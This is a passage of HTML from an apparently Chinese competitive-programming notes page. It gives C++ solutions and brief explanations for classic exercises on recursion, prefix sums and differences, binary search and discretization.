class="hljs-string">&quot;-1&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="奇怪的汉诺塔">奇怪的汉诺塔</h4><p>n盘3塔 ： <span class="math display">\[d[n] = 2 * d[n-1] + 1\]</span> n盘4塔 ： <span class="math display">\[f[n] = min(2*f[i]+d[n-i]) , 1&lt;=i&lt;n\]</span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> d[<span class="hljs-number">15</span>];<br><span class="hljs-type">int</span> f[<span class="hljs-number">15</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>d[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= <span class="hljs-number">12</span>; i++)<br>&#123;<br>d[i] = <span class="hljs-number">2</span> * d[i - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">memset</span>(f, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> f);<br>f[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= <span class="hljs-number">12</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; i; j++)<br>&#123;<br>f[i] = <span class="hljs-built_in">min</span>(f[i], <span class="hljs-number">2</span> * f[j] + d[i - j]);<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">12</span>; i++)<br>&#123;<br>cout &lt;&lt; f[i] &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="约数之和">约数之和</h4><p>等比数列求和sum(p,k):</p><p>k为奇数： <span class="math display">\[1+p+p^2+p^3+...+p^k = (1+pow(p,(K+1)/2))*sum(p,(k-1)/2)\]</span> k为偶数：(转换为奇数) <span class="math display">\[1+p+p^2+p^3+...+p^k = sum(p,k-1)+p^k\]</span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod = <span class="hljs-number">9901</span>;<br>unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; primes;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">power</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (y)<br>&#123;<br><span class="hljs-keyword">if</span> (y &amp; <span class="hljs-number">1</span>)<br>&#123;<br>res = (LL)res * x % mod;<br>&#125;<br>x = (LL)x * x % mod;<br>y &gt;&gt;= <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> % mod;   <span class="hljs-comment">//1+p = (1+p)*sum(p,0)</span><br><span class="hljs-keyword">if</span> (c % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> (LL)<span class="hljs-built_in">sum</span>(p,c<span class="hljs-number">-1</span>)+<span class="hljs-built_in">power</span>(p,c) % mod;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">return</span> (LL)(<span class="hljs-number">1</span> + <span class="hljs-built_in">power</span>(p, (c + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>)) * <span class="hljs-built_in">sum</span>(p, (c - <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>) % mod;<br>&#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> a, b;<br>cin &gt;&gt; a &gt;&gt; b;<br><span class="hljs-type">int</span> A = a;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= a / i; i++)<br>&#123;<br><span class="hljs-keyword">while</span> (a % i == <span class="hljs-number">0</span>)<br>&#123;<br>primes[i]++;<br>a /= i;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (a &gt; <span class="hljs-number">1</span>)<br>&#123;<br>primes[a]++;<br>&#125;<br><span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> prime : primes)<br>&#123;<br><span class="hljs-type">int</span> p = prime.first;<br><span class="hljs-type">int</span> c = prime.second;<br>c = b * c;<br>res = (LL)res * <span class="hljs-built_in">sum</span>(p, c) % mod;<br>&#125;<br><span class="hljs-keyword">if</span> (A == <span class="hljs-number">0</span>) cout &lt;&lt; <span class="hljs-number">0</span> &lt;&lt; endl;<br>cout &lt;&lt; (res + mod) % mod &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="分形之城">分形之城</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><span class="hljs-keyword">typedef</span> pair&lt;LL, LL&gt; PII;<br><br><span class="hljs-function">PII <span class="hljs-title">cal</span><span class="hljs-params">(LL n, LL m)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>LL cnt = <span class="hljs-number">1ll</span> &lt;&lt; (<span class="hljs-number">2</span>*n - <span class="hljs-number">2</span>);  <span class="hljs-comment">//上一等级房子数:4^(n-1)</span><br>LL len = <span class="hljs-number">1ll</span> &lt;&lt; (n - <span class="hljs-number">1</span>);    <span class="hljs-comment">//设置单位长度1—&gt;5m，也对应原点变换距离</span><br>PII last = <span class="hljs-built_in">cal</span>(n - <span class="hljs-number">1</span>, m % cnt);<br><span class="hljs-type">int</span> x = last.first;<br><span class="hljs-type">int</span> y = last.second;<br><span class="hljs-type">int</span> z = m / cnt;           <span class="hljs-comment">//位于哪个象限</span><br><span class="hljs-keyword">if</span> (z == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(-y - len, -x + len);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (z == <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(x + len, y + len);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (z == <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(x + len, y - len);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(y - len, x - len);<br>&#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">while</span> (n--)<br>&#123;<br>LL N, A, B;<br>cin &gt;&gt; N &gt;&gt; A &gt;&gt; B;<br>PII c = <span class="hljs-built_in">cal</span>(N, A<span class="hljs-number">-1</span>);<br>PII d = <span class="hljs-built_in">cal</span>(N, B<span class="hljs-number">-1</span>);<br><span class="hljs-type">double</span> deltax = (<span class="hljs-type">double</span>)(c.first - d.first);<br><span class="hljs-type">double</span> deltay = (<span class="hljs-type">double</span>)(c.second - d.second);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.0lf\n&quot;</span>, <span class="hljs-built_in">sqrt</span>(deltax * deltax + deltay * deltay) * <span class="hljs-number">5</span>);  <span class="hljs-comment">//保存整数</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="前缀和与差分">前缀和与差分</h3><h4 id="激光炸弹">激光炸弹</h4><p>二维差分</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n, m;<br><span class="hljs-type">int</span> s[<span class="hljs-number">5010</span>][<span class="hljs-number">5010</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n &gt;&gt; m;<br><span class="hljs-keyword">while</span> (n--)<br>&#123;<br><span class="hljs-type">int</span> x, y, w;<br>cin &gt;&gt; x &gt;&gt; y &gt;&gt; w;<br>s[x + <span class="hljs-number">1</span>][y + <span class="hljs-number">1</span>] = w;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">5002</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">5002</span>; j++)<br>&#123;<br>s[i][j] = s[i - <span class="hljs-number">1</span>][j] + s[i][j - <span class="hljs-number">1</span>] - s[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + s[i][j];<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = m; i &lt; <span class="hljs-number">5002</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = m; j &lt; <span class="hljs-number">5002</span>; j++)<br>&#123;<br>ans = <span class="hljs-built_in">max</span>(ans, s[i][j]-s[i-m][j]-s[i][j-m]+s[i-m][j-m]);  <span class="hljs-comment">//i-m+1-1</span><br>&#125;<br>&#125;<br>cout &lt;&lt; ans;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="incdec-sequence">IncDec Sequence</h4><p>a中所有数一样 -&gt; a的差分数列b全为0，处理情况：</p><ol type="1"><li>正负配对</li><li>处理多余，选b1或bn配对</li></ol><p>设b中整数和为p，负数绝对值和为q，则有：</p><p>步骤数：max(p,q)</p><p>a数列的不同情况 -&gt; b1的情况 ： abs(p-q)+1 变加不变的情况</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">int</span> a[N], b[N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; a[i];<br>&#125;<br>b[<span class="hljs-number">1</span>] = a[<span class="hljs-number">1</span>];<br>b[n + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> p = <span class="hljs-number">0</span>;    <span class="hljs-comment">//注意不要越界</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> q = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++)<br>&#123;<br>b[i] = a[i] - a[i - <span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (b[i] &gt; <span class="hljs-number">0</span>) p+=b[i];<br><span class="hljs-keyword">if</span> (b[i] &lt; <span class="hljs-number">0</span>) q+=<span class="hljs-built_in">abs</span>(b[i]);<br>&#125;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> res1 = <span class="hljs-built_in">max</span>(p, q);<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> res2 = <span class="hljs-built_in">abs</span>(p - q) + <span class="hljs-number">1</span>;<br>cout &lt;&lt; res1 &lt;&lt; endl;<br>cout &lt;&lt; res2 &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="tallest-cow-s">Tallest Cow S</h4><p>根据M对关系确定身高差分数组C（区间变化），再使用C的差分数组D简化操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">10010</span>;<br><span class="hljs-type">int</span> a[N], b[N];<br><span class="hljs-type">int</span> n;<br>map&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;, <span class="hljs-type">bool</span>&gt; existed;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n ;<br><span class="hljs-type">int</span> i, h, R;<br>cin &gt;&gt; i &gt;&gt; h &gt;&gt; R;<br><span class="hljs-keyword">while</span> (R--)<br>&#123;<br><span class="hljs-type">int</span> x, y;<br>cin &gt;&gt; x &gt;&gt; y;<br><span class="hljs-keyword">if</span> (x &gt; y) <span class="hljs-built_in">swap</span>(x, y);<br><span class="hljs-keyword">if</span> (existed[<span class="hljs-built_in">make_pair</span>(x, y)]) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">//重复关系去重</span><br>b[x + <span class="hljs-number">1</span>] -= <span class="hljs-number">1</span>;<br>b[y] += <span class="hljs-number">1</span>;<br>existed[<span class="hljs-built_in">make_pair</span>(x, y)] = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>a[i] = a[i<span class="hljs-number">-1</span>] + b[i];<br>cout &lt;&lt; a[i] + h &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二分">二分</h3><h4 id="书分至多m组厚度最大值最小">书分至多m组，厚度最大值最小</h4><p>二分厚度，check组数是否满足要求</p><h4 id="最佳牛围栏">最佳牛围栏</h4><h5 id="不限长度的最大子段和">不限长度的最大子段和</h5><p>从头扫描，每个元素依次加入当前子段，<strong>当当前子段和小于0时</strong>，将当前子段清空。扫描过程中出现的子段和最大值即为所求。</p><h5 id="长度至少为l的最大子段和">长度至少为L的最大子段和</h5><p>sum(i)记录子段和</p><p>Aj~Ai（i-j &gt;=L）的最大字段和为sum(i)-min(sum(j))，其中j为0~(i-L)</p><h5 id="解法">解法</h5><p>结合<strong>长度至少为L的最大子段和</strong>，枚举平均值，看在该长度下是否满足要求</p><p>（平均值转化为：该区间减去该值，看长度至少为L的最大子段和是否大于0）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">double</span> a[N];<br><span class="hljs-type">double</span> sum[N];<br><span class="hljs-type">int</span> n, L;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">double</span> mid)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) sum[i] = sum[i - <span class="hljs-number">1</span>] + a[i] - mid;<br><br><span class="hljs-type">double</span> tmpmin = <span class="hljs-number">1e10</span>;<br><span class="hljs-type">double</span> tmpmax = <span class="hljs-number">-1e10</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = L; i &lt;= n; i++)<br>&#123;<br>tmpmin = <span class="hljs-built_in">min</span>(tmpmin, sum[i - L]);<br>tmpmax = <span class="hljs-built_in">max</span>(tmpmax, sum[i] - tmpmin);<br>&#125;<br><span class="hljs-keyword">if</span> (tmpmax &gt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n &gt;&gt; L;<br><span class="hljs-type">double</span> l = <span class="hljs-number">0</span>;<br><span class="hljs-type">double</span> r = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; a[i];<br>r = <span class="hljs-built_in">max</span>(r, a[i]);<br>&#125;<br><span class="hljs-keyword">while</span> (r - l &gt; <span class="hljs-number">1e-5</span>)<br>&#123;<br><span class="hljs-type">double</span> mid = (l + r) / <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">check</span>(mid))<br>l = mid;<br><span class="hljs-keyword">else</span> r = mid;<br>&#125;<br>cout &lt;&lt; <span class="hljs-built_in">int</span>(r * <span class="hljs-number">1000</span>) &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="排序">排序</h3><h4 id="离散化">离散化</h4><h5 id="电影">电影</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 